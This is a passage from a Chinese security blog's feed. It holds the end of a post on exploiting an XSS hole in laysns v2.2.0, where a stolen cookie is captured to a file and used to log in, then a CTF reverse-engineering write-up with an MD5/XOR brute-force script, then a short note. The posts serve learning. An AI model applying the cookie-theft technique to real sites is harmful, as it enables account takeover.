class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>脚本准备好了，接下来就是实施攻击了，打开hack.html，点击click me，页面跳转，cookie.txt收到cookie。用该cookie进行登录。</p><p><img src="/2018/12/26/xss_laysns/2.png" alt=""></p><p>登录成功，攻击完成！</p><p>0x03结语</p><p>由于前端不是很熟，没法实现更高级的攻击，但也学习了一波xss，感受到了跨站脚本攻击的魅力。不过现在的网站，主流浏览器都有各种应对xss的防御策略，想要实施更深层的攻击，还是要继续学习！此篇博客毫无技术含量，仅作学习之余以放松。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;0x00前言&lt;/p&gt;
&lt;p&gt;这其实是电子数据取证的期末考试案例，考的是云服务器取证。看着很像有xss漏洞的样子，抱着试一试的心态测试了一下，哈哈还真有。后来上网查了一下，好像是被曝出有前台xss漏洞的laysns v2.2.0。不管了，修复是不可能去修复了，有漏洞我就先攻击
      
    
    </summary>
    
      <category term="web" scheme="https://j-kangel.github.io/categories/web/"/>
    
    
      <category term="web" scheme="https://j-kangel.github.io/tags/web/"/>
    
      <category term="xss" scheme="https://j-kangel.github.io/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>just reverse it</title>
    <link href="https://j-kangel.github.io/2018/12/10/reverse/"/>
    <id>https://j-kangel.github.io/2018/12/10/reverse/</id>
    <published>2018-12-09T20:19:25.000Z</published>
    <updated>2019-04-04T06:55:17.164Z</updated>
    
    <content type="html"><![CDATA[<p>IDA打开程序，查看start函数C伪代码。<br><img src="/2018/12/10/reverse/001.png" alt=""><br>首先来看第一个for循环，它将输入的16个字符分成4部分。v12占20字节，用来存放大小为16字节的str，sub_402573是MD5计算函数，将4个部分的MD5值存放在64字节大小的v6中。具体对应关系如下图(每一格表示一个字节)。<br><img src="/2018/12/10/reverse/002.png" alt=""></p><p>如何看出sub_402573函数是MD5算法，进入该函数，看到两个函数，进入第一个，有一些初始赋值的操作，猜测为MD5。再返回来看v6，v6占64个字节，分成四部分就是16字节，每个字节包含两个十六进制，刚好每部分可以存一个MD5值，进一步猜测为MD5算法。于是动态调试进行验证。</p><p>将程序丢入od，在call sub_402573的地方下断点，运行程序，输入“1234567890123456”，继续运行，跟踪v6所在的内存，如下图，发现与“1234”、“5678”、“9012”、“3456”的MD5值相同，验证猜测。</p><p><img src="/2018/12/10/reverse/003.png" alt=""></p><p>接着到了strtol函数，这是一个C语言库函数。这里的意思是将v12的值转化为十六进制，中间的参数‘0’表示不返回非法字符串，意味着输入的每个字符应该是十六进制字符，否则每一部分可能就少于4个字符。由图2可知v12[3]+3、v12[2]+2、v12[1]+1、v12刚好对应每一部分字符串。</p><p>sub_4025b1函数，v12[3]+3 &gt; v12[2]+2 &gt; v12[1]+1 &gt; v12 &gt; 999，保证输入顺序。</p><p><img src="/2018/12/10/reverse/004.png" alt=""></p><p>sub_402513函数，是这道题最复杂的地方。首先来看传参，a1为输入值的一部分，a2为该部分的MD5值。关于小头位序存储方式，例如1234存为0x 34 12。因此，a2&gt;&gt;4即为MD5值的第一个字符，a2&amp;0xF为第二字符，(a2+1)&gt;&gt;4为第三个字符，(a2+1)&amp;0xF为第四个字符，这里只取MD5前四个字符作比较。</p><p>数字+48和字母+87是将十六进制转为assic码(ord(‘0’-0)=48，ord(‘a’-a)=87)。</p><p>v3是int型，占四个字节，分别为LOBYTE、BYTE1,、BYTE2、BYTE3。因此是将MD5值的3241与原字符串1234作比较，相等则为真。</p><p><img src="/2018/12/10/reverse/005.png" alt=""></p><p>最后和固定字符串进行异或得到flag，编写脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">"0123456789abcdef"</span>:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">"0123456789abcdef"</span>:</span><br><span class="line">                <span class="keyword">for</span> k <span class="keyword">in</span> <span class="string">"0123456789abcdef"</span>:</span><br><span class="line">                        <span class="keyword">for</span> l <span class="keyword">in</span> <span class="string">"0123456789abcdef"</span>:</span><br><span class="line">                                md5=hashlib.md5()</span><br><span class="line">                                md5.update((i+j+k+l).encode(<span class="string">'utf8'</span>))</span><br><span class="line">                                <span class="keyword">if</span> md5.hexdigest()[:<span class="number">4</span>]==l+j+i+k:</span><br><span class="line">                                        sys.stdout.write(i+j+k+l)</span><br><span class="line"></span><br><span class="line">v3 = <span class="string">"d\x01@flQAizAST\biTB"</span></span><br><span class="line">a = <span class="string">"31795a469327c6e6"</span></span><br><span class="line">flag = strxor(v3,a)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\nflag&#123;%s&#125;"</span>%flag</span><br></pre></td></tr></table></figure><p>输入字符串为”31795a469327c6e6”，flag为：flag{W0w_Y0u_Crack_1t}</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;IDA打开程序，查看start函数C伪代码。&lt;br&gt;&lt;img src=&quot;/2018/12/10/reverse/001.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;首先来看第一个for循环，它将输入的16个字符分成4部分。v12占20字节，用来存放大小为16字节的str，sub_402
      
    
    </summary>
    
      <category term="逆向" scheme="https://j-kangel.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="reverse" scheme="https://j-kangel.github.io/tags/reverse/"/>
    
  </entry>
  
  <entry>
    <title>note</title>
    <link href="https://j-kangel.github.io/2018/11/26/note/"/>
    <id>https://j-kangel.github.io/2018/11/26/note/</id>
    <published>2018-11-25T22:57:17.000Z</published>
    <updated>2019-04-04T06:54:10.144Z</updated>
    
    <content type="html"><![CDATA[<p>life is beautiful!</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;life is beautiful!&lt;/p&gt;

      
    
    </summary>
    
      <category term="随笔" scheme="https://j-kangel.github.io/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="note" scheme="https://j-kangel.github.io/tags/note/"/>
    
  </entry>
  
</feed>
